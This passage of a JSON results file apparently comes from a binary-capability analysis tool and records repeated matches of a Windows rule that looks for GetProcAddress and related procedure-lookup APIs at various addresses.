                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651787391
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651787391
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651787425
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651787425
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651787491
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651787491
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651788414
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651788414
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651788448
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651788448
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651788482
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651788482
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651793449
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651793449
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651793569
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651793569
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651793633
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651793633
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651793753
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651793753
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651794657
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651794657
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651794777
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651794777
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651794897
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651794897
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651794961
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651794961
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651795025
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651795025
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651795089
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651795089
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651795153
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651795153
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
